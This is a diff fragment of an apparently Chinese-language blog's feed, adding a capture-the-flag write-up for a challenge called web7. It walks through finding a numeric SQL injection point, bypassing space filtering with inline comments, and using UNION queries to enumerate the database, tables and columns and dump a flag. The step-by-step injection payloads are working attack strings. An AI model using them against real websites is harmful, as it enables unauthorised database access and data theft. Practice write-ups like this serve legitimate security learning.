@@ -3316,6 +3316,36 @@ tap
 <pre><code>username=1&#39;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1
 </code></pre>
 <p>拿到flag</p>
+<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>与we6相同<br>考点：sql注入 注入点的寻找<br>页面中有一个文章列表,随便点一个</p>
+<p> 从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</p>
+<p>首先判断注入点,输入以下payload,使SQL恒成立</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/1</span><br></pre></td></tr></table></figure>
+
+<p>可以看到,页面正常显示</p>
+<p> 在输入以下payload,使SQL恒不成立</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/and/**/0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到,页面空显示</p>
+<p> 由此可以判断页面存在SQL注入,注入点为<strong>数值型注入</strong>,页面中有显示位,可以尝试<strong>联合注入</strong>进行脱库</p>
+<p>1.判断显示位,此处id传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>
+
+<p>2.判断当前使用的数据库,盲猜flag就藏在当前使用的数据库中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),3</span><br></pre></td></tr></table></figure>
+
+<p>当前使用的数据库是web7</p>
+<p>3.获取当前数据库中的所有表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3</span><br></pre></td></tr></table></figure>
+
+<p>有一个flag表,那flag肯定就藏在这个表里面</p>
+<p>4.获取flag表中的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure>
+
+<p>flag表中只有一个flag字段</p>
+<p>5.查询flag表的flag字段,获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3</span><br></pre></td></tr></table></figure>
+
+<p>成功获取flag</p>
 ]]></content>
       <tags>
         <tag>ctf解题</tag>
